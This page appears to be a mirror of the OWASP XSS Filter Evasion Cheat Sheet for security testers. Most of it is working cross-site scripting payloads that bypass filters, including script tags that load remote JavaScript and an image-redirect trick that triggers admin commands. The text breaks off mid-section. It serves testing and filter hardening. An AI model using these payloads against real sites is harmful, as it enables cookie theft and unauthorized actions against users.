---
title: XSS Filter Evasion Cheat Sheet
hide_title: true
---

<div className="docHero" data-category="encoding-and-sanitization">
  <h1>XSS フィルター回避チートシート</h1>
  <div className="docMeta">
    <span className="docPill">最終更新: 2026-05-20</span>
    <span className="docPill">読了時間: 約 15 分</span>
    <span className="docPill">カテゴリ: 入力検証とサニタイズ</span>
  </div>
</div>

<p className="docLead">XSS フィルター回避チートシートを、原文・翻訳・対比表示で確認できます。ASVS Index 対応の文脈で、公式原文と日本語訳を確認しやすく整理しています。</p>

<div className="tabbedContent">
  <input className="tabInput" type="radio" name="xss-filter-evasion-view" id="xss-filter-evasion-original" />
  <input className="tabInput" type="radio" name="xss-filter-evasion-view" id="xss-filter-evasion-translation" defaultChecked />
  <input className="tabInput" type="radio" name="xss-filter-evasion-view" id="xss-filter-evasion-bilingual" />

  <div className="contentTabs">
    <label htmlFor="xss-filter-evasion-original" title="OWASP 原文">原文</label>
    <label htmlFor="xss-filter-evasion-translation" title="日本語訳">翻訳</label>
    <label htmlFor="xss-filter-evasion-bilingual" title="原文と翻訳を並べて確認">対比表示</label>
  </div>

<section id="xss-filter-evasion-original-panel" className="tabPanel originalPanel contentPanel">

## Introduction

This article is a guide to Cross Site Scripting (XSS) testing for application security professionals. This cheat sheet was originally based on RSnake's seminal XSS Cheat Sheet previously at: `http://ha.ckers.org/xss.html`. Now, the OWASP Cheat Sheet Series provides users with an updated and maintained version of the document. The very first OWASP Cheat Sheet, [Cross Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), was inspired by RSnake's work and we thank RSnake for the inspiration!

## Tests

This cheat sheet demonstrates that input filtering is an incomplete defense for XSS by supplying testers with a series of XSS attacks that can bypass certain XSS defensive filters.

### Basic XSS Test Without Filter Evasion

This attack, which uses normal XSS JavaScript injection, serves as a baseline for the cheat sheet (the quotes are not required in any modern browser so they are omitted here):

```html
<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
```text

### XSS Locator (Polyglot)

This test delivers a 'polyglot test XSS payload' that executes in multiple contexts, including HTML, script strings, JavaScript, and URLs:

```javascript
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
```text

(Based on this [tweet](https://twitter.com/garethheyes/status/997466212190781445) by [Gareth Heyes](https://twitter.com/garethheyes)).

### Malformed A Tags

This test skips the [`href`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#href) attribute to demonstrate an XSS attack using event handlers:

```javascript
\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
```text

Chrome automatically inserts missing quotes for you. If you encounter issues, try omitting them and Chrome will correctly place the missing quotes in URLs or scripts for you:

```javascript
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
```text

(Submitted by David Cross, Verified on Chrome)

### Malformed IMG Tags

This XSS method uses the relaxed rendering engine to create an XSS vector within an IMG tag (which needs to be encapsulated within quotes). We believe this approach was originally meant to correct sloppy coding and it would also make it significantly more difficult to correctly parse HTML tags:

```html
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
```text

(Originally found by Begeek, but it was cleaned up and shortened to work in all browsers)

### fromCharCode

If the system does not allow quotes of any kind, you can `eval()` a `fromCharCode` in JavaScript to create any XSS vector you need:

```html
<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
```text

### Default SRC Tag to Get Past Filters that Check SRC Domain

This attack will bypass most SRC domain filters. Inserting JavaScript in an event handler also applies to any HTML tag type injection using elements like Form, Iframe, Input, Embed, etc. This also allows the substitution of any relevant event for the tag type, such as `onblur` or `onclick`, providing extensive variations of the injections listed here:

```html
<IMG SRC=# onmouseover="alert('xxs')">
```text

(Submitted by David Cross and edited by Abdullah Hussam)

### Default SRC Tag by Leaving it Empty

```html
<IMG SRC= onmouseover="alert('xxs')">
```text

### Default SRC Tag by Leaving it out Entirely

```html
<IMG onmouseover="alert('xxs')">
```text

### On Error Alert

```html
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```text

### IMG onerror and JavaScript Alert Encode

```html
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```text

### Embedded Tab

This approach breaks up the XSS attack:

<!-- markdownlint-disable MD010-->
```html
 <a href="jav	ascript:alert('XSS');">Click Me</a>
```html
<!-- markdownlint-enable MD010-->

### Embedded Encoded Tab

This approach can also break up XSS:

```html
 <a href="jav&#x09;ascript:alert('XSS');">Click Me</a>
```text

### Embedded Newline to Break Up XSS

While some defenders claim that any of the chars 09-13 (decimal) will work for this attack, this is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. Examine the [ASCII table](https://man7.org/linux/man-pages/man7/ascii.7.html) for reference. The next four XSS attack examples illustrate this vector:

```html
<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
```text

#### Example 1: Break Up XSS Attack with Embedded Carriage Return

(Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):

```html
<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
```text

#### Example 2: Break Up JavaScript Directive with Null

Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use `%00` in the URL string or if you want to write your own injection tool you can either use vim (`^V^@` will produce a null) or the following program to generate it into a text file. The null char `%00` is much more useful and helped me bypass certain real world filters with a variation on this example:

```bash
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
```text

#### Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS

This is useful if a filter's pattern match doesn't take into account spaces in the word `javascript:`, which is correct since that won't render, but makes the false assumption that you can't have a space between the quote and the `javascript:` keyword. The actual reality is you can have any char from 1-32 in decimal:

```html
<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
```text

#### Example 4: Non-alpha-non-digit XSS

The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example `\\&lt;SCRIPT\\\\s` != `\\&lt;SCRIPT/XSS\\\\s`:

```html
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
```text

Based on the same idea as above, however, expanded on it, using Rsnake's fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:

```html
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
```text

Yair Amit noted that there is a slightly different behavior between the Trident (IE) and Gecko (Firefox) rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful in a attack if the system does not allow spaces:

```html
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
```text

### Extraneous Open Brackets

This XSS vector could defeat certain detection engines that work by checking matching pairs of open and close angle brackets then comparing the tag inside, instead of a more efficient algorithm like [Boyer-Moore](https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string-search_algorithm) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to suppress a JavaScript error:

```html
<<SCRIPT>alert("XSS");//\<</SCRIPT>
```text

(Submitted by Franz Sedlmaier)

### No Closing Script Tags

With Firefox, you don't actually need the `\\>&lt;/SCRIPT&gt;` portion of this XSS vector, because Firefox assumes it's safe to close the HTML tag and adds closing tags for you. Unlike the next attack, which doesn't affect Firefox, this method does not require any additional HTML below it. You can add quotes if you need to, but they're normally not needed:

```html
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
```text

### Protocol Resolution in Script Tags

This particular variant is partially based on Ozh's protocol resolution bypass below, and it works in IE and Edge in compatibility mode. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The `.j` is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag:

```html
<SCRIPT SRC=//xss.rocks/.j>
```text

(Submitted by Łukasz Pilorz)

### Half Open HTML/JavaScript XSS Vector

Unlike Firefox, the IE rendering engine (Trident) doesn't add extra data to your page, but it does allow the `javascript:` directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this XSS vector. Even though there is no close `\\>` tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following network intrusion detection system (NIDS) regex: `/((\\\\%3D)|(=))\\[^\\\\n\\]\\*((\\\\%3C)|\\<)\\[^\\\\n\\]+((\\\\%3E)|\\>)/` because it doesn't require the end `\\>`. As a side note, this was also affective against a real world XSS filter using an open ended `&lt;IFRAME` tag instead of an `&lt;IMG` tag.

```html
<IMG SRC="`<javascript:alert>`('XSS')"
```text

### Escaping JavaScript Escapes

If an application is written to output some user information inside of a JavaScript (like the following: `&lt;SCRIPT>var a="$ENV&#123;QUERY\\_STRING&#125;";&lt;/SCRIPT&gt;`) and you want to inject your own JavaScript into it but the server side application escapes certain quotes, you can circumvent that by escaping their escape character. When this gets injected it will read `&lt;SCRIPT>var a="\\\\\\\\";alert('XSS');//";&lt;/SCRIPT&gt;` which ends up un-escaping the double quote and causing the XSS vector to fire. The XSS locator uses this method:

```javascript
\";alert('XSS');//
```text

An alternative, if correct JSON or JavaScript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own:

```javascript
</script><script>alert('XSS');</script>
```text

### End Title Tag

This is a simple XSS vector that closes `&lt;TITLE>` tags, which can encapsulate the malicious cross site scripting attack:

```html
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
```text

#### INPUT Image

```html
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
```text

#### BODY Image

```html
<BODY BACKGROUND="javascript:alert('XSS')">
```text

#### IMG Dynsrc

```html
<IMG DYNSRC="javascript:alert('XSS')">
```text

#### IMG Lowsrc

```html
<IMG LOWSRC="javascript:alert('XSS')">
```text

### List-style-image

This esoteric attack focuses on embedding images for bulleted lists. It will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful XSS vector:

```html
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
```text

### VBscript in an Image

```html
<IMG SRC='vbscript:msgbox("XSS")'>
```text

### SVG Object Tag

```javascript
<svg/onload=alert('XSS')>
```text

### ECMAScript 6

```javascript
Set.constructor`alert\x28document.domain\x29
```text

### BODY Tag

This attack doesn't require using any variants of `javascript:` or `&lt;SCRIPT...` to accomplish the XSS attack. Dan Crowley has noted that you can put a space before the equals sign (`onload=` != `onload =`):

```html
<BODY ONLOAD=alert('XSS')>
```text

#### Attacks Using Event Handlers

The attack with the BODY tag can be modified for use in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing). Thanks to Rene Ledosquet for the HTML+TIME updates.

The [Dottoro Web Reference](http://help.dottoro.com/) also has a nice [list of events in JavaScript](http://help.dottoro.com/ljfvvdnm.php).

- `onAbort()` (when user aborts the loading of an image)
- `onActivate()` (when object is set as the active element)
- `onAfterPrint()` (activates after user prints or previews print job)
- `onAfterUpdate()` (activates on data object after updating data in the source object)
- `onBeforeActivate()` (fires before the object is set as the active element)
- `onBeforeCopy()` (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the `execCommand("Copy")` function)
- `onBeforeCut()` (attacker executes the attack string right before a selection is cut)
- `onBeforeDeactivate()` (fires right after the activeElement is changed from the current object)
- `onBeforeEditFocus()` (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)
- `onBeforePaste()` (user needs to be tricked into pasting or be forced into it using the `execCommand("Paste")` function)
- `onBeforePrint()` (user would need to be tricked into printing or attacker could use the `print()` or `execCommand("Print")` function).
- `onBeforeUnload()` (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)
- `onBeforeUpdate()` (activates on data object before updating data in the source object)
- `onBegin()` (the onbegin event fires immediately when the element's timeline begins)
- `onBlur()` (in the case where another popup is loaded and window looses focus)
- `onBounce()` (fires when the behavior property of the marquee object is set to "alternate" and the contents of the marquee reach one side of the window)
- `onCellChange()` (fires when data changes in the data provider)
- `onChange()` (select, text, or TEXTAREA field loses focus and its value has been modified)
- `onClick()` (someone clicks on a form)
- `onContextMenu()` (user would need to right click on attack area)
- `onControlSelect()` (fires when the user is about to make a control selection of the object)
- `onCopy()` (user needs to copy something or it can be exploited using the `execCommand("Copy")` command)
- `onCut()` (user needs to copy something or it can be exploited using the `execCommand("Cut")` command)
- `onDataAvailable()` (user would need to change data in an element, or attacker could perform the same function)
- `onDataSetChanged()` (fires when the data set exposed by a data source object changes)
- `onDataSetComplete()` (fires to indicate that all data is available from the data source object)
- `onDblClick()` (user double-clicks a form element or a link)
- `onDeactivate()` (fires when the activeElement is changed from the current object to another object in the parent document)
- `onDrag()` (requires that the user drags an object)
- `onDragEnd()` (requires that the user drags an object)
- `onDragLeave()` (requires that the user drags an object off a valid location)
- `onDragEnter()` (requires that the user drags an object into a valid location)
- `onDragOver()` (requires that the user drags an object into a valid location)
- `onDragDrop()` (user drops an object (e.g. file) onto the browser window)
- `onDragStart()` (occurs when user starts drag operation)
- `onDrop()` (user drops an object (e.g. file) onto the browser window)
- `onEnd()` (the onEnd event fires when the timeline ends.
- `onError()` (loading of a document or image causes an error)
- `onErrorUpdate()` (fires on a data bound object when an error occurs while updating the associated data in the data source object)
- `onFilterChange()` (fires when a visual filter completes state change)
- `onFinish()` (attacker can create the exploit when marquee is finished looping)
- `onFocus()` (attacker executes the attack string when the window gets focus)
- `onFocusIn()` (attacker executes the attack string when window gets focus)
- `onFocusOut()` (attacker executes the attack string when window looses focus)
- `onHashChange()` (fires when the fragment identifier part of the document's current address changed)
- `onHelp()` (attacker executes the attack string when users hits F1 while the window is in focus)
- `onInput()` (the text content of an element is changed through the user interface)
- `onKeyDown()` (user depresses a key)
- `onKeyPress()` (user presses or holds down a key)
- `onKeyUp()` (user releases a key)
- `onLayoutComplete()` (user would have to print or print preview)
- `onLoad()` (attacker executes the attack string after the window loads)
- `onLoseCapture()` (can be exploited by the `releaseCapture()` method)
- `onMediaComplete()` (When a streaming media file is used, this event could fire before the file starts playing)
- `onMediaError()` (User opens a page in the browser that contains a media file, and the event fires when there is a problem)
- `onMessage()` (fire when the document received a message)
- `onMouseDown()` (the attacker would need to get the user to click on an image)
- `onMouseEnter()` (cursor moves over an object or area)
- `onMouseLeave()` (the attacker would need to get the user to mouse over an image or table and then off again)
- `onMouseMove()` (the attacker would need to get the user to mouse over an image or table)
- `onMouseOut()` (the attacker would need to get the user to mouse over an image or table and then off again)
- `onMouseOver()` (cursor moves over an object or area)
- `onMouseUp()` (the attacker would need to get the user to click on an image)
- `onMouseWheel()` (the attacker would need to get the user to use their mouse wheel)
- `onMove()` (user or attacker would move the page)
- `onMoveEnd()` (user or attacker would move the page)
- `onMoveStart()` (user or attacker would move the page)
- `onOffline()` (occurs if the browser is working in online mode and it starts to work offline)
- `onOnline()` (occurs if the browser is working in offline mode and it starts to work online)
- `onOutOfSync()` (interrupt the element's ability to play its media as defined by the timeline)
- `onPaste()` (user would need to paste or attacker could use the `execCommand("Paste")` function)
- `onPause()` (the onpause event fires on every element that is active when the timeline pauses, including the body element)
- `onPopState()` (fires when user navigated the session history)
- `onPropertyChange()` (user or attacker would need to change an element property)
- `onReadyStateChange()` (user or attacker would need to change an element property)
- `onRedo()` (user went forward in undo transaction history)
- `onRepeat()` (the event fires once for each repetition of the timeline, excluding the first full cycle)
- `onReset()` (user or attacker resets a form)
- `onResize()` (user would resize the window; attacker could auto initialize with something like: `&lt;SCRIPT>self.resizeTo(500,400);&lt;/SCRIPT&gt;`)
- `onResizeEnd()` (user would resize the window; attacker could auto initialize with something like: `&lt;SCRIPT>self.resizeTo(500,400);&lt;/SCRIPT&gt;`)
- `onResizeStart()` (user would resize the window; attacker could auto initialize with something like: `&lt;SCRIPT>self.resizeTo(500,400);&lt;/SCRIPT&gt;`)
- `onResume()` (the onresume event fires on every element that becomes active when the timeline resumes, including the body element)
- `onReverse()` (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)
- `onRowsEnter()` (user or attacker would need to change a row in a data source)
- `onRowExit()` (user or attacker would need to change a row in a data source)
- `onRowDelete()` (user or attacker would need to delete a row in a data source)
- `onRowInserted()` (user or attacker would need to insert a row in a data source)
- `onScroll()` (user would need to scroll, or attacker could use the `scrollBy()` function)
- `onSeek()` (the `onReverse` event fires when the timeline is set to play in any direction other than forward)
- `onSelect()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
- `onSelectionChange()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
- `onSelectStart()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
- `onStart()` (fires at the beginning of each marquee loop)
- `onStop()` (user would need to press the stop button or leave the webpage)
- `onStorage()` (storage area changed)
- `onSyncRestored()` (user interrupts the element's ability to play its media as defined by the timeline to fire)
- `onSubmit()` (requires attacker or user submits a form)
- `onTimeError()` (user or attacker sets a time property, such as dur, to an invalid value)
- `onTrackChange()` (user or attacker changes track in a playList)
- `onUndo()` (user went backward in undo transaction history)
- `onUnload()` (as the user clicks any link or presses the back button or attacker forces a click)
- `onURLFlip()` (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file)
- `seekSegmentTime()` (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)

#### BGSOUND

```javascript
<BGSOUND SRC="javascript:alert('XSS');">
```text

#### & JavaScript includes

```html
<BR SIZE="&{alert('XSS')}">
```text

#### STYLE sheet

```html
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
```text

### Remote style sheet

Using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression. This only works in IE. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page:

```html
<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
```text

#### Remote style sheet part 2

This works the same as above, but uses a `&lt;STYLE>` tag instead of a `&lt;LINK>` tag). A slight variation on this vector was used
to hack Google Desktop. As a side note, you can remove the end `&lt;/STYLE&gt;` tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:

```html
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
```text

#### Remote style sheet part 3

This only works in Gecko rendering engines and works by binding an XUL file to the parent page.

```html
<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
```text

### STYLE Tags that Breaks Up JavaScript for XSS

This XSS at times sends IE into an infinite loop of alerts:

```html
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
```text

### STYLE Attribute that Breaks Up an Expression

```html
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
```text

(Created by Roman Ivanov)

### IMG STYLE with Expressions

This is really a hybrid of the last two XSS vectors, but it really does show how hard STYLE tags can be to parse apart. This can send IE into a loop:

```html
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
```text

### STYLE Tag using Background-image

```html
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
```text

### STYLE Tag using Background

```html
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
```text

### Anonymous HTML with STYLE Attribute

The IE rendering engine doesn't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter:

```html
<XSS STYLE="xss:expression(alert('XSS'))">
```text

### Local htc File

This is a little different than the last two XSS vectors because it uses an .htc file that must be on the same server as the XSS vector. This example file works by pulling in the JavaScript and running it as part of the style attribute:

```html
<XSS STYLE="behavior: url(xss.htc);">
```text

### US-ASCII Encoding

This attack uses malformed ASCII encoding with 7 bits instead of 8. This XSS method may bypass many content filters but it only works if the host transmits in US-ASCII encoding or if you set the encoding yourself. This is more useful against web application firewall (WAF) XSS evasion than it is server side filter evasion. Apache Tomcat is the only known server that by default still transmits in US-ASCII encoding.

```javascript
¼script¾alert(¢XSS¢)¼/script¾
```text

### META

The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs:

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
```text

#### META using Data

Directive URL scheme. This attack method is nice because it also doesn't have anything visible that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. Please see [RFC 2397](https://datatracker.ietf.org/doc/html/rfc2397) for more details.

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
```text

#### META with Additional URL Parameter

If the target website attempts to see if the URL contains `[http://]%28http://);` at the beginning you can evade this filter rule with the following technique:

```html
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert%28'XSS');">
```text

(Submitted by Moritz Naumann)

### IFRAME

If iFrames are allowed there are a lot of other XSS problems as well:

```html
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
```text

### IFRAME Event Based

IFrames and most other elements can use event based mayhem like the following:

```html
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
```text

(Submitted by: David Cross)

### FRAME

Frames have the same sorts of XSS problems as iFrames

```html
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
```text

### TABLE

```html
<TABLE BACKGROUND="javascript:alert('XSS')">
```text

#### TD

Just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors:

```html
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
```text

### DIV

#### DIV Background-image

```html
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```text

#### DIV Background-image with Unicode XSS Exploit

This has been modified slightly to obfuscate the URL parameter:

```html
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
```text

(Original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail)

#### DIV Background-image Plus Extra Characters

RSnake built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):

```html
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```text

#### DIV Expression

A variant of this attack was effective against a real-world XSS filter by using a newline between the colon and `expression`:

```html
<DIV STYLE="width: expression(alert('XSS'));">
```text

### Downlevel-Hidden Block

Only works on the IE rendering engine - Trident. Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our XSS vector to exist. Or the system might try to add comment tags around something in a vain attempt to render it harmless. As we can see, that probably wouldn't do the job:

```javascript
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
```text

### BASE Tag

(Works on IE in safe mode) This attack needs the `//` to comment out the next characters so you won't get a JavaScript error and your XSS tag will render. Also, this relies on the fact that many websites uses dynamically placed images like `images/image.jpg` rather than full paths. If the path includes a leading forward slash like `/images/image.jpg`, you can remove one slash from this vector (as long as there are two to begin the comment this will work):

```html
<BASE HREF="javascript:alert('XSS');//">
```text

### OBJECT Tag

If the system allows objects, you can also inject virus payloads that can infect the users, etc with the APPLET tag. The linked file is actually an HTML file that can contain your XSS:

```html
<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
```text

### EMBED SVG Which Contains XSS Vector

This attack only works in Firefox:

```html
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
```text

(Thanks to nEUrOO for this one)

### XML Data Island with CDATA Obfuscation

This XSS attack works only in IE:

```html
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
```text

### Locally hosted XML with embedded JavaScript that is generated using an XML data island

This attack is nearly the same as above, but instead it refers to a locally hosted (on the same server) XML file that will hold your XSS vector. You can see the result here:

```html
<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
```text

### HTML+TIME in XML

This attack only works in IE and remember that you need to be between HTML and BODY tags for this to work:

```html
<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
</BODY></HTML>
```text

(This is how Grey Magic hacked Hotmail and Yahoo!)

### Assuming you can only fit in a few characters and it filters against `.js`

This attack allows you to rename your JavaScript file to an image as an XSS vector:

```html
<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
```text

### SSI (Server Side Includes)

This requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues:

```javascript
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
```text

### PHP

This attack requires PHP to be installed on the server. Again, if you can run any scripts remotely like this, there are probably much more dire issues:

```php
<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>
```text

### IMG Embedded Commands

This attack only works when this is injected (like a web-board) in a web page behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc. This is one of the lesser used but more useful XSS vectors:

```html
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
```text

#### IMG Embedded Commands part II

This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal `&lt;IMG SRC="httx://badguy.com/a.jpg">` could actually be an attack vector to run commands as the user who views the image link. Here is the `.htaccess` (under Apache) line to accomplish the vector:

```log
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
```text

(Thanks to Timo for part of this)

### Cookie Manipulation

This method is pretty obscure but there are a few examples where `&lt;META` is allowed and it can be used to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc):

```html
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
```text

### XSS Using HTML Quote Encapsulation

This attack was originally tested in IE so your mileage may vary. For performing XSS on sites that allow `&lt;SCRIPT>` but don't allow `&lt;SCRIPT SRC...` by way of a regex filter `/\\<script\\[^\\>\\]+src/i`, do the following:

```html
<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```text

If you are performing XSS on sites that allow `&lt;SCRIPT>` but don't allow `\\<script src...` due to a regex filter that does `/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:"(.)\\*?"|'(.)\\*?'|\\[^'"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i` (This is an important one, because this regex has been seen in the wild):

```html
<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```text

Another XSS to evade the same filter: `/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:"(.)\\*?"|'(.)\\*?'|\\[^'"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i`:

```html
<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
```text

Yet another XSS that evades the same filter: `/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:"(.)\\*?"|'(.)\\*?'|\\[^'"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i`

Generally, we are not discussing mitigation techniques, but the only thing that stops this XSS example is, if you still want to allow `&lt;SCRIPT>` tags but not remote script is a state machine (and of course there are other ways to get around this if they allow `&lt;SCRIPT>` tags), use this:

```html
<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```text

And one last XSS attack to evade, `/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:"(.)\\*?"|'(.)\\*?'|\\[^'"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i` using grave accents (again, doesn't work in Firefox):

